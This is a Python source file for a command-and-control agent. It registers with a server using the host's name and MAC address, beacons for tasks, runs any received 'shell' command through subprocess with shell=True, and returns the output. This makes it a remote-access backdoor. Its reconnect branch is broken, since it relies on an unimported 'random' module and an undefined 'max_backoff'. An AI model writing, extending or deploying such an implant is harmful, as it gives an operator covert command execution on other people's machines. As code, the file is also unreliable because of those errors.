import requests
import time
import uuid
import json
import socket
import subprocess

SERVER = "http://127.0.0.1:8000/rpc"

class Agent:
    def __init__(self):
        self.client_id = None
        self.session = requests.Session()

        self.handlers = {
            "shell": self.handle_shell,
            "print_message": self.handle_print
        }

    def rpc(self, method, **params):
        payload = {
            "jsonrpc": "2.0",
            "method": method,
            "params": params,
            "id": str(uuid.uuid4())
        }

        try:
            res = self.session.post(
                SERVER,
                json = payload,
                timeout = 70
            )

            if res.status_code == 204:
                return None
            
            data = res.json()

            if "error" in data:
                err = data["error"]
                raise Exception(err["message"] if isinstance(err, dict) else err)
                
            return data.get("result")
            
        except Exception as e:
            print("[RPC ERROR]", e)
            return None

    @staticmethod
    def get_hostname():
        return socket.gethostname()

    @staticmethod
    def get_mac():
        mac = uuid.getnode()
        return ':'.join(
            f"{(mac >> shift) & 0xff:02x}"
            for shift in range(40, -1, -8)
        )
    
    def handle_shell(self, params):
        cmd = params.get("cmd")

        if not cmd:
            return self.result(stderr = "no command provided", exit_code = -1)
        
        result = subprocess.run(
            cmd,
            shell = True,
            capture_output = True,
            text = True
        )

        return self.result(
            stdout = result.stdout,
            stderr = result.stderr,
            exit_code = result.returncode
        )

    def handle_print(self, params):
        return self.result(stdout = params.get("message", ""))
    
    @staticmethod
    def result(stdout="", stderr="", exit_code=0):
        return {
            "stdout": stdout,
            "stderr": stderr,
            "exit_code": exit_code
        }

    def identify(self):
        result = self.rpc(
            "identify", 
            hostname = self.get_hostname(),
            mac = self.get_mac()
        )

        if result:
            self.client_id = result.get("client_id")

        return self.client_id

    def beacon(self):
        return self.rpc(
            "beacon", 
            client_id = self.client_id
        )
    
    def send_result(self, task_id, status, output):
        self.rpc(
            "task_result", 
            client_id = self.client_id,
            task_id = task_id,
            result = {
                "status": status,
                "output": output
            }
        )

    def execute_task(self, task):
        if not task:
            return
        
        task_id = task.get("id")
        method = task.get("method")
        params = task.get("params", {})

        handler = self.handlers.get(method)

        if not handler:
            self.send_result(
                task_id, 
                "error",
                self.result(
                    stderr="method not found",
                    exit_code=1
                )
            )
            return
        
        try:
            result = handler(params)

            self.send_result(task_id, "ok", result)
        
        except Exception as e:
            self.send_result(
                task_id,
                "error",
                self.result(
                    stderr = str(e),
                    exit_code = -1
                )
            )

    def run(self):
        print("[*] loading profile...")

        if not self.identify():
            print("[-] failed to identify")
            return
        
        print(f"[+] identified as {self.client_id}")

        backoff = 1

        while True:
            try:
                result = self.beacon()

                if result:
                    self.execute_task(result.get("task"))
                
                backoff = 1
                time.sleep(5)

            except requests.RequestException:
                delay = random.uniform(
                    backoff * 0.5,
                    backoff
                )

                time.sleep(delay)
                backoff = min(backoff * 2, max_backoff)

if __name__ == "__main__":
    Agent().run()